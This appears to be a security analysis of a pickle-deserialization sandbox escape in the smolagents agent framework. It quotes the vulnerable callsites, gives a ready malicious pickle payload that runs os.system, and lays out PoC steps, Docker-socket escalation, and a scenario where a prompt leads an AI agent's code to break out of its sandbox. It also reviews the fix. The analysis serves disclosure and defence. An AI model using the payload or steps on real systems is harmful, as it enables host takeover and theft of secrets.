# Vulnerability Analysis: CVE-2025-14931

## Summary

| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2025-14931 |
| **CWE** | CWE-502 — Deserialization of Untrusted Data |
| **CVSS** | 10.0 (CRITICAL) |
| **Affected Software** | Hugging Face smolagents v1.10.0 through v1.24.0 |
| **Vulnerability Type** | Unsafe pickle deserialization of data from sandboxed remote executors |
| **Impact** | Arbitrary code execution on the host (sandbox escape) |

---

## Root Cause

The `RemotePythonExecutor` base class in smolagents uses Python's `pickle.loads()` to deserialize data received from sandboxed remote execution environments (Docker containers, E2B sandboxes, Modal sandboxes, Blaxel sandboxes, and Pyodide/Wasm environments). The data flow is:

1. The host-side smolagents framework sends Python code to a remote sandboxed environment for execution.
2. The remote environment serializes execution results using `pickle.dumps()` + `base64.b64encode()`.
3. When the remote code raises a `FinalAnswerException`, the serialized (pickled) result is transmitted back to the host via WebSocket messages, HTTP responses, or SDK API calls.
4. The host-side code calls `pickle.loads(base64.b64decode(...))` on the received data **without any validation or safety checks**.

Python's `pickle` module is inherently unsafe for untrusted data — it can execute arbitrary code during deserialization via the `__reduce__` protocol. An attacker who can execute code in the sandboxed environment (or inject/modify data in transit) can craft a malicious pickle payload that escapes the sandbox and executes arbitrary code on the host.

The fundamental design flaw is trusting serialized data from an environment that is explicitly designed to be untrusted (sandboxed). The entire purpose of running code in Docker/E2B/Modal sandboxes is to isolate it from the host, yet `pickle.loads()` completely undermines this isolation.

---

## Vulnerable File(s) and Function(s)

All vulnerable code is in `src/smolagents/remote_executors.py` (version 1.24.0):

### Vulnerable Callsite 1: E2BExecutor (Line 194)
```python
# E2BExecutor.run_code_raise_errors() — line 186-194
def run_code_raise_errors(self, code: str) -> CodeOutput:
    execution = self.sandbox.run_code(code)
    execution_logs = "\n".join([str(log) for log in execution.logs.stdout])
    if execution.error:
        if execution.error.name == RemotePythonExecutor.FINAL_ANSWER_EXCEPTION:
            final_answer = pickle.loads(base64.b64decode(execution.error.value))  # LINE 194 — VULNERABLE
            return CodeOutput(output=final_answer, logs=execution_logs, is_final_answer=True)
```

### Vulnerable Callsite 2: WebSocket-based executors — DockerExecutor, ModalExecutor, BlaxelExecutor (Line 309)
```python
# _websocket_run_code_raise_errors() — line 284-309
def _websocket_run_code_raise_errors(code: str, ws, logger) -> CodeOutput:
    ...
    while True:
        msg = json.loads(ws.recv())
        ...
        elif msg_type == "error":
            if msg_content.get("ename", "") == RemotePythonExecutor.FINAL_ANSWER_EXCEPTION:
                result = pickle.loads(base64.b64decode(msg_content.get("evalue", "")))  # LINE 309 — VULNERABLE
                is_final_answer = True
```

### Vulnerable Callsite 3: WasmExecutor (Line 969)
```python
# WasmExecutor.run_code_raise_errors() — line 930-969
def run_code_raise_errors(self, code: str) -> CodeOutput:
    ...
    elif result_data.get("error"):
        error = result_data["error"]
        if (
            error.get("pythonExceptionType") == RemotePythonExecutor.FINAL_ANSWER_EXCEPTION
            and "pythonExceptionValue" in error
        ):
            result = pickle.loads(base64.b64decode(error["pythonExceptionValue"]))  # LINE 969 — VULNERABLE
```

### Serialization Origin (Line 140)
The patched `forward` method injected into the remote environment creates the pickle payload:
```python
# _patch_final_answer_with_exception() — line 132-140
def forward(self, *args, **kwargs) -> Any:
    import base64
    import pickle
    class FinalAnswerException(BaseException):
        def __init__(self, value):
            self.value = value
    raise FinalAnswerException(base64.b64encode(pickle.dumps(self._forward(*args, **kwargs))).decode())
```
This source code is extracted (via `__source__` attribute) and sent to the remote environment. However, the vulnerability is on the HOST side — any code running in the remote can raise `FinalAnswerException` with arbitrary pickle data.

---

## Triggering Input

The triggering input is a **base64-encoded malicious pickle payload** delivered as the `evalue` of a `FinalAnswerException` from the remote environment.

### Exact Payload Construction
```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ("touch /tmp/pwned",))

malicious_payload = base64.b64encode(pickle.dumps(RCE())).decode()
```

This payload, when received by the host and processed by `pickle.loads(base64.b64decode(malicious_payload))`, will call `os.system("touch /tmp/pwned")` on the HOST.

### How to Deliver the Payload

For the **DockerExecutor** (most practical for lab reproduction):

The code executed in the Jupyter kernel container must raise a `FinalAnswerException` where the `evalue` (which the Jupyter kernel gateway passes over WebSocket) contains the base64-encoded malicious pickle.

```python
# Code to execute inside the remote Jupyter kernel:
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ("touch /tmp/pwned",))

class FinalAnswerException(BaseException):
    def __init__(self, value):
        self.value = value

raise FinalAnswerException(base64.b64encode(pickle.dumps(RCE())).decode())
```

When this code executes in the container, the Jupyter kernel sends a WebSocket message with:
- `msg_type` = `"error"`
- `content.ename` = `"FinalAnswerException"`
- `content.evalue` = the base64-encoded malicious pickle string

The host-side `_websocket_run_code_raise_errors()` at line 309 receives this message and calls `pickle.loads(base64.b64decode(evalue))`, triggering RCE on the host.

---

## Attack Scenario

### Scenario 1: Malicious Code in Agent Pipeline (Primary)
1. An attacker provides a prompt or input that causes the AI agent to execute code in the sandboxed remote executor.
2. The agent sends the code to the DockerExecutor, which runs it inside a Jupyter kernel in a Docker container.
3. The code in the container crafts a malicious pickle payload using the `__reduce__` protocol.
4. The code raises a `FinalAnswerException` with the base64-encoded malicious pickle as the value.
5. The Jupyter kernel gateway serializes this exception and sends it over the WebSocket.
6. The host-side smolagents code deserializes the evalue with `pickle.loads()`, executing arbitrary code on the host.

### Scenario 2: Compromised Sandbox Environment
1. If an attacker can compromise the Docker container, E2B sandbox, or Modal environment (e.g., via a supply chain attack on a package installed in the sandbox), they can intercept any FinalAnswerException and replace the payload with a malicious pickle.

### Scenario 3: Direct PoC Without Full Agent
1. Create a `DockerExecutor` instance directly (without a full CodeAgent).
2. Call `executor.run_code_raise_errors(malicious_code)` where `malicious_code` is the Python string that crafts and raises the malicious FinalAnswerException.
3. The host-side deserialization triggers RCE.

**For the PoC, Scenario 3 is the simplest and most reliable approach.**

---

## Impact

- **Arbitrary code execution on the host machine** — the attacker can execute any command as the user running the smolagents process.
- **Complete sandbox escape** — the entire purpose of using Docker/E2B/Modal is defeated.
- **No authentication required** — the vulnerability is in the data flow between the sandbox and the host; no additional auth is needed.
- **Network-accessible** — if the Jupyter kernel's WebSocket is network-exposed, a MITM attacker could also inject malicious payloads.

### What the attacker achieves:
- Full RCE on the host with the privileges of the smolagents process
- Access to host filesystem, environment variables (including API keys like HF_TOKEN, OPENAI_API_KEY), and network
- Potential lateral movement if the host has access to other systems

---

## Authentication Requirements

**No authentication is required.** The vulnerability is pre-auth in the context of the remote executor communication:

- The Jupyter kernel gateway in the DockerExecutor uses **no authentication by default** (the `KernelGatewayApp` is configured with `--KernelGatewayApp.allow_origin='*'`).
- The WebSocket connection between the host and the container is unauthenticated.
- For E2B/Modal/Blaxel, authentication is to the cloud service, but the data returned from the sandbox is trusted without additional validation.

For a PoC that directly instantiates a `DockerExecutor`:
1. No login or credentials needed
2. Just instantiate `DockerExecutor(additional_imports=[], logger=logger)` — it builds and starts the Docker container automatically
3. Then call `run_code_raise_errors()` with the malicious code

---

## Fix Assessment

The fix (commit `41a3b005fadc6edd587a3ac6f6812987da405e26`) is **thorough and addresses the root cause**. It:

1. **Replaces all three `pickle.loads()` callsites** with `_deserialize_final_answer()`, a method that uses JSON-based safe serialization by default.
2. **Introduces `SafeSerializer`** — a JSON-based serializer that handles common Python types (str, int, float, bool, None, dict, list, tuple, set, bytes, complex, frozenset, PIL.Image, datetime, Decimal, Path, numpy arrays, dataclasses).
3. **Defaults to `allow_pickle=False`** — all executor constructors now default to safe-only mode.
4. **Uses prefix-based format detection** — `"safe:"` for JSON, `"pickle:"` for pickle. With `allow_pickle=False`, pickle data is rejected with a clear error.
5. **Updates the remote-side serialization** — the patched `forward` method now uses `_serialize_with_fallback()` which only uses JSON-safe serialization when `allow_pickle=False`.

### Minor Issues in Initial Fix (Addressed by Follow-up Commits)
The initial fix had an edge case in `_deserialize_final_answer()` where the `else` branch (no prefix / legacy format) tried to parse as JSON, which would fail on legacy base64-encoded pickle data. This was fixed in:
- `7f21b7480e9510cbee57ec5cae8969646a1f17ed` — correctly handled legacy no-prefix pickle with `allow_pickle` check
- `440e91923d79145fadfb206e56ad91fc23251eb0` — removed legacy no-prefix pickle support entirely

The combined fix (all commits) is complete. With `allow_pickle=False` (default), there is no code path that calls `pickle.loads()` on data from the remote executor.

**Note:** When `allow_pickle=True` (legacy mode), `pickle.loads()` is still used, but this is explicitly opt-in with security warnings. This is an acceptable design trade-off.

---

## Potential Bypass Vectors

None identified for the default configuration (`allow_pickle=False`). The fix properly rejects all pickle data in safe mode.

With `allow_pickle=True`, the vulnerability is intentionally re-enabled (with warnings). This is not a bypass — it's an explicit opt-in.

---

## Escalation Path

The initial primitive is **arbitrary code execution on the host**, which is already the maximum impact. No further escalation is needed. The attacker has full control of the host process.

If the host has Docker socket access (which is likely when using DockerExecutor), the attacker can:
1. Mount the host filesystem via Docker
2. Create privileged containers
3. Escape to the host OS entirely

---

## Related Attack Surface

All `pickle.loads()` callsites in the vulnerable version are in `src/smolagents/remote_executors.py`. There are **four** distinct locations:

| # | File:Line | Function | Executor(s) |
|---|-----------|----------|-------------|
| 1 | `remote_executors.py:194` | `E2BExecutor.run_code_raise_errors()` | E2BExecutor |
| 2 | `remote_executors.py:309` | `_websocket_run_code_raise_errors()` | DockerExecutor, ModalExecutor, BlaxelExecutor |
| 3 | `remote_executors.py:969` | `WasmExecutor.run_code_raise_errors()` | WasmExecutor |
| 4 | `remote_executors.py:98` | `send_variables()` (runs in remote) | All executors (host→remote direction, less critical) |

The fix addresses callsites 1-3 (the dangerous remote→host direction). Callsite 4 is host→remote (the host serializes, the remote deserializes) which is the trusted direction.

No other files in the smolagents codebase use `pickle.loads()` or `pickle.load()`.

---

## Build System

| Field | Value |
|-------|-------|
| **Build System** | setuptools (pyproject.toml) |
| **Language** | Python 3 (>=3.10) |
| **Package Name** | `smolagents` |
| **Version** | 1.24.0 |

---

## Build Commands

```bash
# Install vulnerable version with Docker executor support
pip install "smolagents[docker]==1.24.0"

# Or install from checked-out source
pip install -e ".[docker]"
```

---

## Dependencies

### Core (automatically installed):
- `huggingface-hub>=0.31.2,<1.0.0`
- `requests>=2.32.3`
- `rich>=13.9.4`
- `jinja2>=3.1.4`
- `pillow>=10.0.1`
- `python-dotenv`

### Docker executor (most practical for PoC):
- `docker>=7.1.0` (Python Docker SDK)
- `websocket-client`

---

## Runtime Requirements

### For DockerExecutor PoC:
1. **Docker daemon** must be running and accessible (Docker socket at `/var/run/docker.sock`)
2. **Python 3.10+** on the host
3. **Network access** — the DockerExecutor builds a Docker image based on `python:3.12-bullseye` and needs to pull it (or it must be pre-cached)
4. **Port 8888** available on localhost (default for Jupyter kernel gateway, configurable)
5. **No API keys needed** — the PoC does not require HF tokens or any AI model. We directly instantiate the executor and send code.

### Docker Image Built by DockerExecutor:
The DockerExecutor automatically builds a Docker image with this Dockerfile:
```dockerfile
FROM python:3.12-bullseye
RUN pip install jupyter_kernel_gateway jupyter_client ipykernel
EXPOSE 8888
CMD ["jupyter", "kernelgateway", "--KernelGatewayApp.ip='0.0.0.0'", "--KernelGatewayApp.port=8888", "--KernelGatewayApp.allow_origin='*'"]
```

### PoC Approach:
The simplest PoC approach:
1. Set up a Python environment with `smolagents[docker]==1.24.0` and Docker access
2. Create a `DockerExecutor` instance (it will build the Jupyter image and start a container)
3. Call `executor.run_code_raise_errors()` with malicious code that raises `FinalAnswerException` with a malicious pickle payload
4. Verify RCE by checking for a marker file (e.g., `/tmp/pwned`) on the HOST

Alternatively, a lower-level PoC can bypass the DockerExecutor entirely:
1. Start a Jupyter kernel gateway in a container manually
2. Connect to the WebSocket directly
3. Send an execute request with the malicious code
4. The WebSocket response triggers `pickle.loads()` when processed by `_websocket_run_code_raise_errors()`

The first approach (using DockerExecutor directly) is recommended because it demonstrates the real-world attack surface.
